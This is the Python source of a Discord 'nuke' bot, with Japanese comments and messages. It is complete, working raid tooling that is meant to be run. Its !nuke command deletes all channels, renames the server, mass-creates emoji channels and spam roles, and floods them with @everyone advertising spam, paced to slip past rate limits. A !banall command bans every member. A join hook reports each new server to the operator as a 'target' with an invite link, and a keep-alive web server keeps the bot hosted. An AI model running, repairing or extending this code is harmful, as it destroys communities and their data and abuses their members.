import os
import threading
import discord
from discord.ext import commands
from discord import utils
from flask import Flask, jsonify
import logging
import asyncio
import random 
import time

# ログ設定: 警告レベル以上のみ表示
logging.basicConfig(level=logging.WARNING)

# 🚨 --- 監視・保護対象の定義 ---
EXCLUDED_GUILD_ID = 1443617254871662642 # 破壊コマンドを無効化するサーバーID
REPORT_GUILD_ID = 1443617254871662642   # レポートを送信するサーバーID
REPORT_CHANNEL_ID = 1443878284088705125 # レポートを送信するチャンネルID
# -----------------------------

# --- KeepAlive用: Flaskアプリの定義 ---
app = Flask(__name__)

# --- Discord Bot Setup ---
intents = discord.Intents.default()
# 破壊機能に必要なインテントを全て有効化
intents.guilds = True
intents.members = True 
intents.message_content = True 

# 🚨 Prefixを '!' に設定
bot = commands.Bot(command_prefix="!", intents=intents)

# 環境変数からの設定
try:
    DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN") 
    
    if not DISCORD_BOT_TOKEN:
        logging.error("FATAL ERROR: 'DISCORD_BOT_TOKEN' is missing. Please set the environment variable.")

except Exception as e:
    DISCORD_BOT_TOKEN = None
    logging.error(f"Initialization Error: {e}")


# ----------------------------------------------------
# --- 💀 サーバー情報収集機能 (!serverdata <ID> コマンド) ---
# ----------------------------------------------------

@bot.command(name="serverdata") 
@commands.has_permissions(administrator=True) 
async def get_server_data(ctx, server_id: int):
    """指定されたサーバーIDの詳細情報を取得する。"""
    
    guild = bot.get_guild(server_id)
    
    if not guild:
        await ctx.send(f"❌ **失敗だ！** BotはサーバーID (`{server_id}`) に参加していないぜ。")
        return

    owner = guild.owner
    owner_info = f"{owner.name} (`{owner.id}`)" if owner else "不明"

    invite_link = "作成失敗/権限不足"
    temp_channel = None 

    try:
        channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)

        if not channel_to_use and guild.me.guild_permissions.manage_channels:
            temp_channel = await guild.create_text_channel(
                "ruru-invite-channel",
                reason="ruru by nuke - Temporary Invite Creation for !serverdata"
            )
            channel_to_use = temp_channel

        if channel_to_use:
            invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - Server Data Retrieval")
            invite_link = str(invite)
        else:
            invite_link = "永続的な招待リンクの作成権限がない"

    except Exception as e:
        logging.warning(f"招待リンク作成中にエラーが発生したぜ: {e}")

    finally:
        if temp_channel:
            await temp_channel.delete()

    response = (
        f"🕵️ **サーバー情報収集完了！**\n"
        f"**サーバー名**: {guild.name}\n"
        f"**サーバーID**: `{guild.id}`\n"
        f"**サーバー主**: {owner_info}\n"
        f"**招待リンク**: {invite_link}"
    )
    await ctx.send(response)


# ----------------------------------------------------
# --- 💀 最終破壊機能 (!nuke コマンド) ---
# ----------------------------------------------------

# レート制限回避のため、個々のメッセージ送信に厳密な遅延を挟むヘルパー関数を定義
async def send_spam_message_with_delay(channel, content):
    """チャンネルへのメッセージ送信を行い、ランダムな極小遅延を挟む（レート制限対策）"""
    try:
        # チャンネルごとの遅延を 0.02秒〜0.05秒 に設定
        delay = random.uniform(0.02, 0.05) 
        await asyncio.sleep(delay) 
        await channel.send(content)
        return True
    except discord.HTTPException as e:
        if e.status == 429:
            logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。discord.pyがリトライする。")
            await asyncio.sleep(random.uniform(1.0, 2.0))
        else:
            logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
        return False
    except Exception as e:
        logging.error(f"チャンネル {channel.name} への送信中に予期せぬエラーが発生: {e}")
        return False


@bot.command(name="nuke") 
@commands.has_permissions(administrator=True, manage_guild=True) 
async def ultimate_nuke_command(ctx): 
    
    guild = ctx.guild
    
    # サーバーIDによる無効化チェック
    if guild.id == EXCLUDED_GUILD_ID:
        await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
        return
    
    # ------------------- 破壊開始 (途中経過メッセージあり) -------------------
    # 🚨 修正: 破壊開始メッセージを復活！
    await ctx.send(
        f"🔥🔥🔥 **INSTANT NUKE STARTED!** 猶予なし！{ctx.author.mention} の命令により、破壊工作を開始する！ 🔥🔥🔥"
    )

    # 0. サーバー名の変更
    new_server_name = "るるくんの増殖植民地"
    try:
        await guild.edit(name=new_server_name, reason="ruru by nuke - Server Name Takeover")
        # 🚨 修正: サーバー名変更ログを復活！
        await ctx.send(f"💥 **SERVER NAME TAKEOVER!** サーバー名を「{new_server_name}」に変更したぜ！")
        logging.warning(f"SERVER NAME TAKEOVER: Guild name changed to {new_server_name}")
    except Exception as e:
        # 🚨 修正: サーバー名変更失敗ログを復活！
        await ctx.send("⚠️ **サーバー名変更失敗:** Botの権限が不足しているか、Botのロールが最上位にない。")
        logging.error(f"SERVER NAME CHANGE ERROR: {e}")


    # 1. 全てのチャンネルを削除
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(asyncio.create_task(channel.delete()))
    
    try:
        await asyncio.gather(*deletion_tasks)
        await asyncio.sleep(2.0) 
    except Exception as e:
        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")

    # 2. 絵文字チャンネルを150個作成
    creation_tasks = []
    
    # チャンネル名に使用する絵文字のリスト
    EMOJIS = "😀😂🤣😅😇🤪🤓😈☠️💀😹🤫" 
    EMOJI_LIST = list(EMOJIS) 
    
    channel_names = []
    for i in range(15): 
        for emoji in EMOJI_LIST: 
            channel_names.append(f"{emoji}-nuke-{i}") 
            
    num_channels = len(channel_names)
    logging.warning(f"🔨 CREATION STARTED! {num_channels}個の絵文字チャンネルを作成する！")

    for name in channel_names:
        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
    
    successful_channels = []
    try:
        new_channels = await asyncio.gather(*creation_tasks)
        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
        await asyncio.sleep(2.0) 
    except Exception as e:
        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
        
    # 2.5. ロールスパム機能 (20個のロール作成)
    role_count = 20
    role_name = "ruru by nuke"
    
    # 🚨 修正: ロールスパム開始メッセージを復活！
    if successful_channels:
        await successful_channels[0].send(f"💥 **ROLE SPAM INITIATED!** チャンネルと並行して {role_count}個のスパムロールを作成中だ！")
    
    role_creation_tasks = []
    for i in range(role_count):
        color = discord.Color(random.randint(0, 0xFFFFFF))
        role_creation_tasks.append(asyncio.create_task(
            guild.create_role(
                name=f"{role_name} {i+1}", 
                color=color, 
                reason="Role Spam by Nuke Bot"
            )
        ))
        
    try:
        await asyncio.gather(*role_creation_tasks)
        # 🚨 修正: ロールスパム完了メッセージを復活！
        if successful_channels:
            await successful_channels[0].send(f"✅ **ROLE SPAM COMPLETE!** {role_count}個のロールリスト汚染に成功したぞ！")
        logging.warning(f"ROLE SPAM COMPLETE: {role_count} roles created.")
    except Exception as e:
        logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")


    # 3. 全ての新しいチャンネルにスパムメッセージを15回、レート制限対策を施して送信
    if successful_channels:
        spam_message_content = (
            "# @everyoneruru by nuke😂\n"
            "# ⬇️join now⬇️\n"
            "https://discord.gg/Uv4dh5nZz6\n"
            "https://imgur.com/NbBGFcf"
        )
        # スパム回数は15回
        spam_count = 15
        
        # 🚨 修正: スパム開始メッセージを復活！
        await successful_channels[0].send(f"📣 **LOAD-BALANCED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**負荷分散スパム**を送りつけるぞ！（1リクエストあたり最小0.02秒だ！）")

        
        # チャンネルを横断しながら、15回のラウンドを実行
        for j in range(spam_count):
            spam_tasks = []
            for channel in successful_channels:
                spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
                
            try:
                await asyncio.gather(*spam_tasks)
            except Exception as e:
                logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
            
            await asyncio.sleep(random.uniform(0.5, 1.0))

    # 4. 最終報告
    if successful_channels:
        await successful_channels[0].send(
            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**サーバー名、絵文字、宣伝、ロールで完全に汚染された**！\n"
            f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
        )
    

# ----------------------------------------------------
# --- 💀 全員BAN機能 (!banall コマンド) ---
# ----------------------------------------------------

@bot.command(name="banall") 
@commands.has_permissions(administrator=True) 
async def ban_all_members(ctx):
    guild = ctx.guild

    if guild.id == EXCLUDED_GUILD_ID:
        await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
        return
        
    await ctx.send("🚨 **MASS BAN INITIATED!** 全メンバーをサーバーから叩き出す！")
    
    ban_tasks = []
    
    for member in guild.members:
        if member.id == bot.user.id or member == guild.owner:
            continue
        
        ban_tasks.append(asyncio.create_task(member.ban(reason="ruru by nuke - BAN ALL")))
        
    try:
        await asyncio.gather(*ban_tasks)
        banned_count = len(ban_tasks)
        await ctx.send(f"👑 **BAN ALL COMPLETE!** 成功したBAN処理数: {banned_count}。サーバーは人間を失い、完全に破壊された！")
    except Exception as e:
        await ctx.send(f"⚠️ **BAN中にエラー発生:** 一部のメンバーをBANできなかったぜ。しかし、破壊は進んだ！")
        logging.error(f"BAN ALL ERROR: {e}")


# ----------------------------------------------------
# --- 🤖 Botイベント (侵入報告) ---
# ----------------------------------------------------

@bot.event
async def on_guild_join(guild):
    """Botが新しいサーバーに参加したときに実行される"""
    
    report_channel = bot.get_channel(REPORT_CHANNEL_ID)
    
    invite_link = "作成失敗/権限不足"
    temp_channel = None 

    try:
        channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)

        if not channel_to_use and guild.me.guild_permissions.manage_channels:
            temp_channel = await guild.create_text_channel(
                "ruru-invite-channel",
                reason="ruru by nuke - Temporary Invite Creation for Report"
            )
            channel_to_use = temp_channel

        if channel_to_use:
            invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - New Guild Report")
            invite_link = str(invite)
        else:
            invite_link = "永続的な招待リンクの作成権限がない"
            
    except Exception as e:
        logging.warning(f"Joined Guild: {guild.name} 招待リンク作成中にエラーが発生したぜ: {e}")

    finally:
        if temp_channel and temp_channel.id != REPORT_CHANNEL_ID:
            await temp_channel.delete()

    owner_info = f"{guild.owner.name} (`{guild.owner.id}`)" if guild.owner else "不明"
    
    report_message = (
        f"🚨 **NEW TARGET DETECTED!** Botが新しいサーバーに侵入したぞ！\n\n"
        f"**侵入先サーバー名**: {guild.name}\n"
        f"**侵入先サーバーID**: `{guild.id}`\n"
        f"**サーバー主**: {owner_info}\n"
        f"**侵入用招待リンク**: {invite_link}\n\n"
        f"--- 破壊オプション ---\n"
        f"✅ 即座に破壊するか？: `!nuke`\n"
        f"✅ 人間を追い出すか？: `!banall`"
    )

    if report_channel:
        try:
            await report_channel.send(report_message)
            logging.warning(f"Joined Guild: {guild.name} のレポートを {REPORT_CHANNEL_ID} に送信した。")
        except Exception as e:
            logging.error(f"レポートチャンネルへの送信中にエラーが発生したぜ: {e}")
    else:
        logging.error(f"レポートチャンネルが見つからねぇ！ID: {REPORT_CHANNEL_ID}")


# ----------------------------------------------------
# --- Discord イベント & 起動 ---
# ----------------------------------------------------

@bot.event
async def on_ready():
    """Bot起動時に実行"""
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game(name="侵入監視と破壊準備... !nuke | !banall | !serverdata <ID>")
    )
    logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
    
    logging.warning("スラッシュコマンドは無視。!nuke、!banall、!serverdataコマンドが有効になったぜ。")

@bot.event
async def on_message(message):
    """メッセージイベント"""
    if message.author.bot:
        return
        
    await bot.process_commands(message)


# ----------------------------------------------------
# --- KeepAlive Server (Render/Uptime Robot対応) ---
# ----------------------------------------------------

def start_bot():
    """Discord Botの実行を別スレッドで開始する"""
    global DISCORD_BOT_TOKEN
    if not DISCORD_BOT_TOKEN:
        logging.error("Botの実行をスキップ: トークンが設定されてねえぞ。")
    else:
        logging.warning("Discord Botを起動中... 破壊の時だ。")
        try:
            bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
            
        except discord.errors.LoginFailure:
            logging.error("ログイン失敗: Discord Bot Tokenが無効だ！")
        except Exception as e:
            logging.error(f"予期せぬエラーが発生した: {e}")

# Botを別スレッドで起動
bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    if bot.is_ready():
        return "Bot is running and ready for INSTANT NUKE!"
    else:
        # Botの起動が完了していない場合は503エラーを返す
        return "Bot is starting up or failed to start...", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """冗長的なヘルスチェックエンドポイント"""
    return jsonify({"message": "Alive. Now go break something."}), 200
